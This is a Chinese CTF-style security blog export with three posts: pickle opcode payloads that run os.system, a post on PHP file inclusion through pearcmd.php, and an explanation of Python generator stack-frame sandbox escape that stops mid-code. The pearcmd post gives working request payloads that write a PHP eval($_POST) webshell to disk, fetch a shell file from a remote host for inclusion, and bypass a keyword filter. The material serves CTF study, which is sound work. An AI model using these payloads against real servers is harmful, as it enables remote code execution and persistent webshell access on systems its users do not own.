<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>(<span class="built_in">eval</span>,[<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)])</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">eval</span>,[<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>opcode如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">tuple</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>还有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">bytes</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>pickle反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>利用pearcmd.php进行文件包含</title>
    <url>/2024/04/28/pearcmd.php/</url>
    <content><![CDATA[<h3 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h3><p>好看，爱看，多看</p>
<span id="more"></span>

<p><strong>文件包含还可以利用<code>pearcmd.php</code>这个pecl&#x2F;pear中的文件。</strong></p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7,4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装</p>
<p><strong>不过，在Docker任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径一般在<code>/usr/local/lib/php</code>。</strong></p>
<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。<strong>但当遇到是一个文件包含的场景，那么我们就可以包含到pear中的文件</strong>，进而利用其中的特性搞事。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>有pear扩展（这样才能有pearcmd.php）</li>
<li>php开启了<code>register_argc_argv</code>选项</li>
<li>知道pearcmd.php的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</li>
<li>有包含点，能包含php后缀的文件，而且没有open_basedir的限制</li>
</ul>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>注意：以下测试均是镜像为<code>php:7.2-apache</code>并且<code>register_argc_argv</code>为On</p>
<p><strong>对于<code>register_argc_argv</code>选项，</strong>如果这个选项字段选了<code>ON</code>的话，**URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，而且就算后面的内容含有等号也会被作为键值被赋值给<code>$_SERVER[&#39;argv&#39;]</code>**，如下所示：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427211536292.png" alt="image-20240427211536292"></p>
<p>pear程序在执行pear命令的时候会在<code>pearcmd.php</code>获取命令行参数，看看pearcmd.php代码：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="regexp">//</span> fix CGI sapi oddity - the -- in pear.bat/pear is <span class="keyword">not</span> removed</span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; isset($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    unset($argv[<span class="number">1</span>]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>$argv</code>的赋值，再看看pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($argv)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array($_SERVER[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array($GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    $msg = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里先看<code>$argv</code>是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就尝试<code>$_SERVER[&#39;argc&#39;]</code>是否存在，注意这个参数我们可通过<code>query-string</code>控制。（个人看了几篇文章，应该都是直接利用<code>$SERVER[&#39;argv&#39;]</code>，稍微注意一下）</p>
<p>看一看可以利用的参数：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427210050568.png" alt="image-20240427210050568"></p>
<p>其中的<code>config-create</code>、<code>install</code>、<code>download</code>可以尝试利用。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>这里需要包含pearcmd.php的原因就是这样才能执行pear程序。</p>
<h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>为了方便理解后面的payload，这里稍微提前说一点知识，</p>
<ul>
<li>如上所说，<code>register_argc_argv</code>选项为On的时候，URL中?后面的内容都会传入<code>$_SERVER[&#39;x&#39;]</code>，但是对于不同符号有区别，看下图比较：</li>
</ul>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222128934.png" alt="image-20240426222128934"></p>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222206499.png" alt="image-20240426222206499"></p>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222235994.png" alt="image-20240426222235994"></p>
<p><strong>由此可以很容易看出&amp;是无法分割参数的，真正能优先分隔参数的是+号。</strong></p>
<ul>
<li>为什么最前面需要一个+号？看看我们的payload传上去后变量的值，如下：</li>
</ul>
<p><img src="/2024/04/28/pearcmd.php/image-20240427223551642.png" alt="image-20240427223551642"></p>
<p>这里可以看到数组下标为0的内容为空，此时结合pearcmd.php的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="line">if (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123;</span><br><span class="line">    unset($argv[1]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, &quot;c:C:d:D:Gh?sSqu:vV&quot;);</span><br><span class="line">if (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意if条件的内容，以及<code>array_shift()</code>函数，函数说明如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427224040193.png" alt="image-20240427224040193"></p>
<p>注意if条件的内容，这个if语句的处理是直接对argv[1]进行分析，所以第一个元素不会发挥作用，故这里需要将第一个单元利用+设置为空字符或其他不会影响pear命令正常执行的参数都可以</p>
<p>同时可以看看这个函数，个人感觉还是挺有关系的。</p>
<h6 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h6><p>对于这个命令，<strong>主要作用就是将内容写入文件中</strong>，需要传入两个参数，第一个参数会被写入到文件中，其中第二个参数是写入的文件路径。</p>
<p>构造出的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/hello.php</span><br><span class="line"></span><br><span class="line">注意：可以这样设置一句话木马：</span><br><span class="line">&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt; </span><br><span class="line">防止多个输出，推荐！！</span><br></pre></td></tr></table></figure>

<p>然后<strong>包含hello.php用蚁剑或者直接连就行</strong>。</p>
<p>测试了一下，不能直接在浏览器上传payload，由于直接在浏览器传参使得php的如<code>&lt;</code>和单引号等标签因被URL编码而失去效应，<strong>需要抓包后再传参</strong>这样才能被识别为php代码，可以防止浏览器将传入的字符编码。</p>
<p><strong>对比一下即可：</strong></p>
<p>正常抓包后传参：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428013848033.png" alt="image-20240428013848033"></p>
<p>直接传参结果如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428014007326.png" alt="image-20240428014007326"></p>
<p>可以很明显的看出第一张图片中的一句话木马成功作为php代码被解析，所以可以正常利用，</p>
<p>同时第二张图片也可以看出来并没有正常解析，<strong>所以谨记要抓包后传参。</strong></p>
<p><strong>一定注意</strong>：需要抓包后修改，因为浏览器会url编码再传入，会导致php的如<code>&lt;</code>等标签会被编码而失去效应</p>
<h6 id="install"><a href="#install" class="headerlink" title="install"></a>install</h6><p>可以利用install远程连接一个vps下载文件到靶机的临时目录里，再包含这个文件达成rce。</p>
<p><code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录</p>
<p>使用的payload为(基本上不行，主要看下面那个)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xxx.xxx/123.php</span><br></pre></td></tr></table></figure>

<p>同样还是抓包传payload（方便），页面回显</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428015602654.png" alt="image-20240428015602654"></p>
<p>这串Payload下载后的文件保存的路径是<code>&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download</code>，显示不可写，这是配置问题，因为这个目录时新建的，没有权限对其写入从而导致失败。</p>
<p><strong>另外的payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http:<span class="comment">//[ip]:[port]/shell.txt</span></span><br></pre></td></tr></table></figure>

<p>抓包放包后页面如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428022500841.png" alt="image-20240428022500841"></p>
<p>这里给出了路径，然后去包含这个路径即可</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428022535506.png" alt="image-20240428022535506"></p>
<p>测试了一下，<strong>这个shell文件最好不要是php文件，只要有php特征即可</strong>，反正文件包含在识别到后会当做php文件执行。</p>
<h6 id="download"><a href="#download" class="headerlink" title="download"></a>download</h6><p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://xxxxxxx/shell.jpg</span><br></pre></td></tr></table></figure>

<p>这个是直接下载到当前页面。</p>
<p>一直没复现出来，最后要用的时候再搜吧。这里显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">downloading shell.txt ...</span><br><span class="line">Could not download from &quot;http://47.100.223.173/shell.txt&quot; (could not open /var/www/html/shell.txt for writing)</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>

<h6 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h6><p>类似于第一个，也复现成功</p>
<p>其他的利用方式，个人感觉挺好的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear -c /tmp/shell.php -d man_dir=&lt;?=eval($_POST[&#x27;x&#x27;]);?&gt; -s</span><br></pre></td></tr></table></figure>

<p>看看选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/somefile# pear help options</span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration in `file&#x27;</span><br><span class="line">     -C file    find system configuration in `file&#x27;</span><br><span class="line">     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -G         start in graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     unset `foo&#x27; in the user configuration</span><br><span class="line">     -h, -?     display help/usage (this message)</span><br><span class="line">     -V         version information</span><br></pre></td></tr></table></figure>

<p>相当于写配置到<code>/tmp/shell.php</code>,payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[&#x27;x&#x27;]);?&gt;+-s+</span><br></pre></td></tr></table></figure>

<p>复现成功：<br><img src="/2024/04/28/pearcmd.php/image-20240428032008052.png" alt="image-20240428032008052"></p>
<h5 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h5><p>当<code>pearcmd</code>关键词被ban，可以使用<code>peclcmd.php</code>作为平替，在这个php文件中其实就是引用了pearcmd.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;</span><br><span class="line">    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);</span><br><span class="line">    $raw = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br><span class="line">    $raw = true;</span><br><span class="line">&#125;</span><br><span class="line">define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);</span><br><span class="line">require_once &#x27;pearcmd.php&#x27;;</span><br></pre></td></tr></table></figure>





<p>参考文章:<br><code>https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html</code></p>
<p><code>https://blog.csdn.net/Mrs_H/article/details/122386511</code></p>
<p><code>https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</code></p>
<p><code>https://yuy0ung.github.io/2024/03/27/pearcmd/</code></p>
]]></content>
      <categories>
        <category>php相关漏洞</category>
        <category>文件包含</category>
        <category>利用pearcmd.php</category>
      </categories>
  </entry>
  <entry>
    <title>python栈帧逃逸</title>
    <url>/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="python栈帧逃逸"><a href="#python栈帧逃逸" class="headerlink" title="python栈帧逃逸"></a>python栈帧逃逸</h1><p>一个挺新的逃逸方式，最近比赛都在考，赶快学习。</p>
<span id="more"></span>

<h3 id="生成器（henerator）"><a href="#生成器（henerator）" class="headerlink" title="生成器（henerator）"></a>生成器（henerator）</h3><p>Python生成器是一个特殊的迭代器，可以逐个产生元素，而不是一次性产生所有元素。生成器的工作方式与迭代器相似，<strong>可以通过for循环或者<code>__next__()</code>方法（或者使用next()函数）逐个获取生成器中的元素。</strong></p>
<p>生成器<strong>使用yield关键字来定义生成器函数</strong>。迭代器在执行的过程中，<u>遇到yield语句时</u>，函数执行过程会被暂停，此时会保留函数的状态，<u>并将yield 后面的表达式作为当前迭代的值返回</u>。当再次调用生成器时，生成器会从上次暂停的位置继续执行，直到遇到下一个yield语句。</p>
<p>给一个例子看看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:   <span class="comment">#注意这里有一个循环</span></span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">c=haha()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#next()函数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br><span class="line"><span class="comment">#__next__()方法</span></span><br><span class="line"><span class="built_in">print</span>(c.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line"><span class="comment">#for循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">ha</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">3</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">4</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">5</span><br></pre></td></tr></table></figure>

<p>根据这个结论可以基本了解工作过程，在调用这个生成器函数时，<strong>它会立即返回一个生成器对象，而不是执行函数体</strong>。然后再调用生成器对象的<code>__next__</code>方法或next()函数时，生成器会从上次暂停的位置即系执行，直到遇到下一个yield语句。</p>
<p><strong>注意一个生成器里面可以有多个yield关键字</strong>，流程不变，但是如果生成器在反复执行的时候，如果找不到下一个yield，或引发StopIteration错误，测试代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">c=haha()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br><span class="line"><span class="built_in">print</span>(c.__next__())</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">&lt;generator <span class="built_in">object</span> haha at <span class="number">0x00000261ABB64940</span>&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;generator <span class="built_in">object</span> haha at <span class="number">0x00000261ABB64940</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#但是此时只要多一个print(next(c))就会报错StopIteration</span></span><br></pre></td></tr></table></figure>

<p>注意看注释部分，这里说明了返回对象没有限制，但是对于yield关键字使用next()时需要根据语法有限制。</p>
<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。</p>
<p>生成表达式的语法与列表推导式类似，但是使用圆括号而不是方括号，可以使用for循环遍历生成器对象，或者使用next()函数逐个获取生成器中的元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=(i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(a))</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x0000020AA0D8D630</span>&gt;</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">ha</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>



<h3 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h3><p><code>gi_code</code>：生成器对应的code对象。</p>
<p><code>gi_frame</code>：生成器对应的frame（栈帧）对象</p>
<p><code>gi_running</code>：生成器是否在执行。生成器函数在yield以后、执行yield的下一行代码前初遇frozen状态，此时这个属性的值为0。</p>
<p><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
<p><strong>这里的重点是<code>gi_frame</code> 属性</strong></p>
<p><code>gi_frame</code>是一个与生成器和协程相关的属性。它指向生成器或协程当前执行的帧对象，如果这个生成器或者协程正在执行的话。帧对象表示代码执行的当前上下文，<strong>包含了局部遍历、执行的字节码指令等信息。</strong></p>
<h3 id="生成器的执行原理"><a href="#生成器的执行原理" class="headerlink" title="生成器的执行原理"></a>生成器的执行原理</h3><p><strong>先简单了解堆栈：</strong></p>
<p>都是内存管理方式，来看不同点</p>
<ul>
<li>堆是在程序运行时，申请某个大小的内存空间。堆的内存都是动态分配的，在访问时和一般内存的访问没有区别，用。</li>
<li>栈遵循的原则就是后进先出，它在栈顶进行插入和删除操作。</li>
</ul>
<p>————————————————————————————<br>而对于生成器的执行原理，如下：<br>在每个代码块（模块、类、函数）运行的时候，Python解释器会先为其创建一个栈帧，同时与物理栈帧不同，python 解释器所创建的帧栈是在进程的堆区创建的，这样的话在帧栈就是被 python 解释器所控制，<strong>只要不主动释放，代码块的栈帧仍会存在，我们依然能够获取到已经执行完代码的帧栈</strong><br><img src="/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605142732236.png" alt="image-20240605142732236"></p>
<h3 id="栈帧（frame）"><a href="#栈帧（frame）" class="headerlink" title="栈帧（frame）"></a>栈帧（frame）</h3><p>在Python中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。<strong>每当Python解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息</strong>。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
<p>栈帧的重要属性：<br><code>f_locals</code>：一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。</p>
<p><code>f_globals</code>：包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>
<p><code>f_builtins</code>：表示当前帧的内置命名空间，包含了所有的内置变量和函数。</p>
<p><code>f_code</code>：一个代码对象，包含了函数或方法的字节码指令、常量、变量名等信息。</p>
<p><code>f_lasti</code>：整数，表示最后执行的字节码指令的索引。</p>
<p><code>f_back</code>：调用栈的前一帧</p>
<p>**这里介绍一下<code>f_code</code>**：</p>
<p>（这个是我从题里面看到的，学一下）</p>
<p>一个代码对象，<em>它包含了函数的字节码</em>、函数的全局和局部命名空间以及其他信息，对象具有以下属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">co_argcount: 函数的命名参数数量（不包括 *args 和 **kwargs）。</span><br><span class="line">co_nlocals: 函数中的局部变量数量。</span><br><span class="line">co_stacksize: 函数调用所需的栈空间。</span><br><span class="line">co_consts: 函数中使用的常量。</span><br><span class="line">co_names: 函数中使用的全局变量的名称。</span><br><span class="line">co_varnames: 函数中使用的局部变量的名称。</span><br><span class="line">co_filename: 函数定义所在的文件名。</span><br><span class="line">co_firstlineno: 函数定义的第一行所在的行号。</span><br><span class="line">co_flags: 与函数相关的标志，例如是否是生成器函数、是否接受任意数量的位置参数等等。</span><br><span class="line">co_code: 函数的字节码指令序列。</span><br></pre></td></tr></table></figure>

<p>先看一下如下代码：</p>
<p>比如我想打印一个对象的字节码，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;ajhduiahdu&#125;&quot;</span></span><br><span class="line">    flag=<span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(haha)) <span class="comment">#这里打印字节码</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;flag&#123;ajhduiahdu&#125;&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>           <span class="number">4</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;haha&#x27;</span>)</span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">10</span> RETURN_VALUE</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>常见的字节码指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD_CONST：加载一个常量</span><br><span class="line">LOAD_FAST: 在局部作用域中(比如函数)加载一个当前作用域的局部变量</span><br><span class="line">LOAD_GLOBAL: 在局部作用域(比如函数)中加载一个全局变量或者内置变量</span><br><span class="line">LOAD_NAME: 在全局作用域中加载一个全局变量或者内置变量</span><br><span class="line">STORE_FAST: 在局部作用域中定义一个局部变量, 来建立和某个对象之间的映射关系</span><br><span class="line">STORE_GLOBAL: 在局部作用域中定义一个global关键字声明的全局变量, 来建立和某个对象之间的映射关系</span><br><span class="line">STORE_NAME: 在全局作用域中定义一个全局变量, 来建立和某个对象之间的映射关系</span><br></pre></td></tr></table></figure>

<p>注意看这里的Output，flag的值是完整被打印出来的，</p>
<p><strong>结合这个特点，在栈帧逃逸中我们可以尝试读取字节码来读取flag</strong>，就需要用到<code>co_consts</code>属性来读取。</p>
<p>思路如上，具体操作可以看下面的CISCN的例题</p>
<p><strong>获取到内置方法的格式可以如下：</strong></p>
<p>从全局变量获取到了内置命名空间，注意在利用内置函数的时候一定要想到这个点，不一定可以用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]  <span class="comment">#这里获取到了内置命名空间，在这里就可以获取到内置函数</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span>)如何获取，可以另外用一个变量来获取，再利用，如下：</span><br><span class="line"><span class="built_in">str</span>=d.<span class="built_in">str</span>  <span class="comment">#这样就可以直接利用str来替代内置函数str()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;   </span><br><span class="line"></span><br><span class="line"></span><br><span 